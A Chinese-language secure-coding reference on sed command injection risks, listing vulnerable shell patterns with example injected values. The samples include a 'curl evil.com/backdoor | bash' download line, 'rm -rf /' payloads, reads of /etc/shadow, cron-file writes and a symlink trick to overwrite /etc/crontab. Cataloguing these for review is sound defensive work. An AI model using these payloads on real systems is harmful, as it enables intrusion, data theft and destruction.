# sed 命令安全风险

## 涉及的安全问题
- 命令注入（e 标志执行命令、正则注入、地址范围注入）
- 修改配置未校验参数（换行符注入、a/i/c 命令注入、分隔符注入）
- 操作任意文件（-i 修改任意文件、w 写入任意文件、r 读取任意文件）
- 跨目录读写（通过 r/w 跨目录读写）

## 高危模式

### 命令注入 — e 标志执行命令（GNU sed）
```bash
sed -e "s/.*/$USER_INPUT/e" file.txt
# USER_INPUT = "'; rm -rf /; echo '" → 执行任意命令

sed -i "s/^version=.*/version=$USER_VER/e" /etc/app.conf
# USER_VER = "1.0'; curl evil.com/backdoor | bash; echo '1.0"
```

### 命令注入 — 正则/地址范围注入
```bash
sed "s/$USER_PATTERN/replacement/" file.txt
# USER_PATTERN = ".*//e; rm -rf /; #" → 正则注入 + 命令执行

sed "$USER_ADDR s/old/new/" file.txt
# USER_ADDR = "1e rm -rf /" → 通过地址表达式执行命令

sed -i "s/old/new/; $USER_EXPR" /etc/app.conf
# USER_EXPR = "1d; s/.*/hacked/" → 注入额外 sed 表达式
```

### 操作任意文件 — r/w 命令
```bash
# w 写入任意文件
sed -n "w $USER_FILE" input.txt
# USER_FILE = "/etc/cron.d/backdoor"

sed -n "/password/w $USER_OUTPUT" /etc/app.conf
# USER_OUTPUT = "/tmp/stolen_passwords" → 导出敏感配置

# r 读取任意文件
sed "/pattern/r $USER_FILE" input.txt
# USER_FILE = "/etc/shadow" → 读取并插入任意文件内容

sed -i "/^# END/r $USER_FILE" /etc/app.conf
# 将敏感文件内容插入配置文件

# -i 修改任意文件
sed -i "s/old/new/" "$USER_FILE"
# USER_FILE = "/etc/passwd"
```

### 修改配置未校验参数 — 换行符注入
```bash
sed -i "s/^listen_port=.*/listen_port=$USER_PORT/" /etc/app.conf
# USER_PORT = "8080\nlisten_address=0.0.0.0" → 注入新配置行

sed -i "s/^database=.*/database=$USER_DB/" /etc/db.conf
# USER_DB = "production\nadmin_password=hacked" → 注入新配置项
```

### 修改配置未校验参数 — 分隔符注入
```bash
sed -i "s/^server=.*/server=$USER_SERVER/" /etc/app.conf
# USER_SERVER = "evil.com/; rm -rf /; #" → 分隔符 / 导致命令执行
```

### 修改配置未校验参数 — a/i/c 命令注入
```bash
# a 追加行
sed -i "/^\[database\]/a $USER_CONFIG" /etc/app.conf
# USER_CONFIG = "host=evil.com\nport=3306"

# i 插入行
sed -i "1i $USER_HEADER" /etc/app.conf
# USER_HEADER = "# Injected\nmalicious_key=value"

# c 替换整行
sed -i "/^listen_port/c $USER_LINE" /etc/app.conf
# USER_LINE = "listen_port=8080\nbind_address=0.0.0.0"
```

### 修改配置未校验参数 — 用户可控搜索/替换模式
```bash
sed -i "s/$USER_SEARCH/replacement/" /etc/app.conf
# USER_SEARCH = ".*" → 替换所有行，破坏配置

sed -i "s/pattern/$USER_REPLACE/" /etc/app.conf
# USER_REPLACE = "&\nmalicious_line=value" → & 引用匹配内容并注入新行

sed -i "s/\(.*\)/$USER_REPLACE/" /etc/app.conf
# USER_REPLACE = "\1\ninjected_line=value" → 反向引用注入
```

### 操作任意文件 — 删除行导致配置丢失
```bash
sed -i "/$USER_PATTERN/d" /etc/app.conf
# USER_PATTERN = ".*" → 删除所有配置行
```

### 命令注入 — 不闭合注入（绕过命令拼接符过滤）

即使过滤了 `;`、`|`、`&` 等命令拼接符，只要允许 `/`（sed 定界符），就可能通过 e 或 w 参数实现不闭合注入：

```bash
# 场景 1: 匹配打印行
sed -n "/${value}/p" config_file
# 注入: value = "a/eid 1>&0/p"
# e 优先级高于 p，命令被执行（需 config_file 中含字符 a）

# 场景 2: 删除行
sed -i "/^key=$value/d" config_file
# 注入: value = "xxx/eid 1>&0/d"
# e 优先级高于 d，命令被执行（需 config_file 中含 key=）

# 场景 3: 替换行 — s 参数下 e 无法直接生效，改用 w 参数写文件
sed -i "s/pattern/$value/" config_file
# 注入: value = "test/w/etc/cron.d/backdoor"
# 将匹配内容写入任意文件

# 场景 3 提权利用：创建软链接文件名为 g
# ln -s /etc/crontab g
# 注入: value = "test/w/g"
# sed 将 test 写入文件 g（实际写入 /etc/crontab）

# 场景 4: 新增行 — a 参数后所有内容当作文本，需多行输入换行绕过
sed -i "1a $value" config_file
# 如果 value 支持多行输入（如从配置文件读取），换行后注入 e 命令
```

### 操作任意文件 — w 参数覆盖写（不闭合场景）

```bash
# 在 s 参数替换模式下，e 参数无法不闭合使用，但 w 参数可以
sed -i "s/pattern/$value/g" config_file
# value = "replacement/w/tmp/evil"
# 将 replacement 写入 /tmp/evil

# 配合软链接实现任意文件覆盖：
# 1. 创建软链接: ln -s /target/file g
# 2. 注入: value = "data/w/g"
# 3. sed 将 data 写入 g → 实际覆盖 /target/file
```
